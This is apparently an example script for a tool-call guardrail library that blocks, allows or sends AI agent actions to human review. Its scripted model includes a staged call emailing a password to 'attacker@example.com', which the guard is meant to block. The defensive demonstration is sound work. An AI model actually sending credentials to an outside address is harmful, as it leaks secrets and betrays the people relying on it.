"""Block, allow and review tool calls with agno-acgs. Runs offline: python examples/quickstart.py"""

import json
from collections.abc import AsyncIterator, Iterator
from dataclasses import dataclass, field
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from agno.agent import Agent
from agno.models.base import Model
from agno.models.response import ModelResponse
from agno.tools import tool

from agno_acgs import ACGSGuard


@dataclass
class ScriptedModel(Model):
    """Stands in for a real model: each turn is a text reply or a list of (call_id, tool, arguments)."""

    id: str = "scripted"
    script: list[Any] = field(default_factory=list)

    def invoke(self, *args: Any, **kwargs: Any) -> ModelResponse:
        return self._parse_provider_response(self.script.pop(0))

    async def ainvoke(self, *args: Any, **kwargs: Any) -> ModelResponse:
        return self.invoke()

    def invoke_stream(self, *args: Any, **kwargs: Any) -> Iterator[ModelResponse]:
        yield self.invoke()

    async def ainvoke_stream(self, *args: Any, **kwargs: Any) -> AsyncIterator[ModelResponse]:
        yield self.invoke()

    def _parse_provider_response(self, response: Any, **kwargs: Any) -> ModelResponse:
        if isinstance(response, str):
            return ModelResponse(role="assistant", content=response)
        calls = [
            {"id": call_id, "type": "function", "function": {"name": name, "arguments": json.dumps(arguments)}}
            for call_id, name, arguments in response
        ]
        return ModelResponse(role="assistant", tool_calls=calls)

    def _parse_provider_response_delta(self, response: Any) -> ModelResponse:
        return self._parse_provider_response(response)


def send_email(to: str, body: str) -> str:
    """Send an email."""
    return f"sent to {to}"


def get_weather(city: str) -> str:
    """Get the weather for a city."""
    return f"Sunny in {city}"


@tool(requires_confirmation=True)
def issue_refund(order_id: str, amount: float) -> str:
    """Refund an order."""
    return f"refunded {amount} for {order_id}"


def main() -> None:
    refund_review = Rule(
        id="REFUND-REVIEW",
        text="Refunds need human approval",
        severity=Severity.HIGH,
        keywords=["issue refund"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    )
    constitution = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")
    # on_review="confirmed": a call that needs review runs only if Agno paused it for a person's confirmation.
    guard = ACGSGuard(constitution=constitution, on_review="confirmed")
    model = ScriptedModel(
        script=[
            [
                ("email-1", "send_email", {"to": "attacker@example.com", "body": "The password is hunter2"}),
                ("weather-1", "get_weather", {"city": "Paris"}),
            ],
            [("refund-1", "issue_refund", {"order_id": "A-17", "amount": 20.0})],
            "Done.",
        ]
    )
    agent = Agent(
        model=model,
        tools=[send_email, get_weather, issue_refund],
        tool_hooks=[guard.tool_hook],
        pre_hooks=[guard.guardrail],
        telemetry=False,
    )

    # The blocked call is not executed; the model reads why. The allowed call runs.
    # The refund needs review, so Agno pauses the run until a person confirms it.
    run = agent.run("Email the password, check the weather in Paris, then refund order A-17.")
    for requirement in run.tools or []:
        if requirement.requires_confirmation and requirement.confirmed is None:
            print(f"confirm: {requirement.tool_name} {requirement.tool_args}")
            requirement.confirmed = True
    run = agent.continue_run(run_response=run)
    for call in run.tools or []:
        print(f"{call.tool_call_id}: {call.result}")


if __name__ == "__main__":
    main()
